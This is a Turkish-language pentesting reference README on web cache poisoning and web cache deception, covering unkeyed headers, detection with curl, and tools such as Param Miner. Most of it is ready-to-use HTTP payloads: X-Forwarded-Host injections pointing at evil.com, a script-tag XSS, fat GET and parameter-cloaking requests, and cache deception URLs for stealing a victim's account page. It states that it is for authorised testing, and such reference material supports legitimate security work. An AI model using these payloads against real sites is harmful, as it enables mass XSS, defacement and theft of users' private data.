[🇬🇧 English](../../README.md) | [🇮🇹 Italiano](README.it.md)

# 💾 Web Önbellek Zehirleme (Web Cache Poisoning) Başvuru Kılavuzu

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 Web Önbellek Zehirleme (Cache Poisoning) Nedir?

**Web Önbellek Zehirleme (Web Cache Poisoning)**, önbellekleme (caching) mekanizmalarındaki davranış farklılıklarını istismar ederek zararlı HTTP yanıtlarının önbelleğe alınmasını ve bu önbellekten diğer kullanıcılara servis edilmesini sağlayan bir zafiyettir.

### Etkileri
- 🔴 **Kitlesel XSS (Mass XSS)** - Sitedeki tüm kullanıcılara önbellekten kalıcı XSS saldırısı düzenleme
- 🔴 **Tahrifat (Defacement)** - Web sayfalarında zararlı veya istenmeyen içerik görüntületme
- 🔴 **Hizmet Dışı Bırakma (DoS)** - Hata sayfalarını önbelleğe alarak servisi kesintiye uğratma
- 🔴 **Kötü Amaçlı Yönlendirme** - Kullanıcıları zararlı alan adlarına yönlendirme

---

## 🔍 Önbellek Mekanizmasını Anlama

### Önbellek Anahtarları (Cache Keys)
```
# Genellikle önbellek anahtarına dahil edilenler:
URL + Host başlığı (Host header)

# Dahil EDİLMEYENLER (Unkeyed - Anahtarlanmamış girdiler):
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Özel HTTP başlıkları (Custom headers)
```

### Önbelleği Tespit Etme
```bash
# Önbellek başlıklarını inceleme
curl -I https://target.com

# Önbellek göstergeleri:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

## 💉 Anahtarlanmamış Başlık Enjeksiyonu (Unkeyed Header Injection)

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Eğer dönen yanıtta evil.com yansıtılıyorsa:
<script src="//evil.com/malicious.js">
```

### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Yönlendirmeye veya protokol karışıklığına sebep olabilir:
Location: http://target.com/
```

### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Yanıtta yansıma (reflection) kontrolü yapın
```

### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Dizin yolu kısıtlamalarını atlatma
```

---

## 🔥 Saldırı Teknikleri

### Temel Önbellek Zehirleme ile XSS
```http
# 1. Yanıtta yansıyan anahtarlanmamış (unkeyed) girdiyi bulun
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. Yanıt bu XSS payload'ı ile önbelleğe alınır
# 3. Sayfayı ziyaret eden tüm kullanıcılar önbellekten XSS çalıştırır
```

### Dizin Yolu Üzerinden Önbellek Zehirleme
```http
# Farklı kaynak yollarıyla istek gönderme
GET /page;evil HTTP/1.1
Host: target.com

# Beklenenden farklı bir anahtarla önbelleklenebilir
```

### Şişman GET İstekleri (Fat GET Requests)
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# İstek gövdesi yanıtı etkileyebilir ancak önbellek anahtarında yer almayabilir
```

### Parametre Maskeleme (Parameter Cloaking)
```http
# Ruby on Rails örneklerinde
GET /page?param=value;callback=evil HTTP/1.1

# Önbellek sunucusu ile uygulama sunucusunun farklı ayrıştırması
```

---

## 🛠️ Web Cache Deception (Önbellek Aldatması)

### Zehirlemeden (Poisoning) Farkı!
```
# Poisoning (Zehirleme): Saldırganın zararlı payload'ı kurbanlar için önbelleklenir
# Deception (Aldatma): Kurbanın hassas verisi saldırgan için önbelleğe alınır

# Web Cache Deception adımları:
1. Kurbana şu bağlantıyı açtırın: /account/settings.css
2. Sunucu /account/settings yanıtını döndürür (.css uzantısını yok sayar)
3. Önbellek sunucusu .css uzantısını statik kaynak sanıp genele açık önbelleğe kaydeder
4. Saldırgan /account/settings.css adresini önbellekten çeker
5. Kurbanın hassas verisini ele geçirir
```

### Örnek URL Payload'ları
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

## 📊 Cache Buster Tekniği

### Test Amaçlı Kullanım
```http
# Diğer kullanıcıları etkilememek için isteklerinize cache buster ekleyin:
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Her test isteği benzersiz bir önbellek anahtarına sahip olur
```

---

## 🛠️ Araçlar

### Param Miner (Burp Suite Eklentisi)
```
1. Burp Suite BApp Store üzerinden Param Miner eklentisini kurun
2. İsteğe sağ tıklayın → Extensions → Param Miner
3. "Guess headers" seçeneğini çalıştırın
4. Anahtarlanmamış başlıkları (unkeyed headers) inceleyin
```

### Manuel Test
```bash
# Başlıkları tek tek test etme
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

## 📋 Yaygın Anahtarlanmamış Başlıklar

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

## 📚 Kaynaklar

- [PortSwigger Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Araştırması](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web Cache Deception Makalesi](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 Önbelleği Zehirleyin!</b><br>
  <i>Yalnızca yetkili ve yasal testler içindir!</i>
</p>
